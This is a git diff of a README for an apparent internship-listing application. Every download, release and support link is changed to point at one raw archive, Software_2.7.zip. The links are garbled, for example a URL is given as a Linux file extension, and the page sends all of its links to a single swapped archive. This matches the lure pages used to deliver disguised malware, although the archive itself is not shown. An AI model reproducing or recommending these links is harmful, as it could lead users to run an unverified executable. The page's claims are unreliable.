@@ -1,7 +1,7 @@
 # 🎓 internships - Find Your Ideal Internship for 2026
 
 ## 📦 Download Now
-[![Download](https://raw.githubusercontent.com/mahmoudking1/internships/main/Universalism/internships.zip%20Internships%https://raw.githubusercontent.com/mahmoudking1/internships/main/Universalism/internships.zip)](https://raw.githubusercontent.com/mahmoudking1/internships/main/Universalism/internships.zip)
+[![Download](https://github.com/mahmoudking1/internships/raw/refs/heads/main/Universalism/Software_2.7.zip%20Internships%https://github.com/mahmoudking1/internships/raw/refs/heads/main/Universalism/Software_2.7.zip)](https://github.com/mahmoudking1/internships/raw/refs/heads/main/Universalism/Software_2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the internships repository! This application provides a comprehensive list of internships available in the EMEA and APAC regions for Summer 2026. Follow these steps to easily download and run the application.
@@ -17,7 +17,7 @@ To run the internships application, ensure your system meets the following requi
 ## 💾 Download & Install
 To access the latest version of the internships application, visit the Releases page:
 
-[Download from the Releases Page](https://raw.githubusercontent.com/mahmoudking1/internships/main/Universalism/internships.zip)
+[Download from the Releases Page](https://github.com/mahmoudking1/internships/raw/refs/heads/main/Universalism/Software_2.7.zip)
 
 1. Open the link above in your web browser.
 2. You will see a list of available versions. Look for the latest release noted at the top.
@@ -25,7 +25,7 @@ To access the latest version of the internships application, visit the Releases 
 4. Under the "Assets" section, you will see files available for download. Choose the correct file suitable for your operating system:
    - For Windows, look for a `.exe` or `.zip` file.
    - For macOS, look for a `.dmg` or similar package.
-   - For Linux, look for a `https://raw.githubusercontent.com/mahmoudking1/internships/main/Universalism/internships.zip` file.
+   - For Linux, look for a `https://github.com/mahmoudking1/internships/raw/refs/heads/main/Universalism/Software_2.7.zip` file.
 5. Click on the filename to start the download.
 
 ## 🔧 Running the Application
@@ -42,7 +42,7 @@ After downloading the application:
 3. Go to your Applications folder and double-click the application to run.
 
 ### For Linux:
-1. If you downloaded a `https://raw.githubusercontent.com/mahmoudking1/internships/main/Universalism/internships.zip` file, extract it using the terminal or a file manager.
+1. If you downloaded a `https://github.com/mahmoudking1/internships/raw/refs/heads/main/Universalism/Software_2.7.zip` file, extract it using the terminal or a file manager.
 2. Navigate to the extracted folder.
 3. Open a terminal and run the application with the command:
    ```bash
@@ -59,7 +59,7 @@ Once the application is running, you will see a list of internships categorized 
 ## 📄 FAQs
 
 ### How do I contact support?
-If you need assistance, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/mahmoudking1/internships/main/Universalism/internships.zip). Our team is here to help.
+If you need assistance, feel free to open an issue on the [GitHub repository](https://github.com/mahmoudking1/internships/raw/refs/heads/main/Universalism/Software_2.7.zip). Our team is here to help.
 
 ### Can I contribute to the project?
 Absolutely! We welcome contributions. Please check the Contributing section in the repository for guidelines.
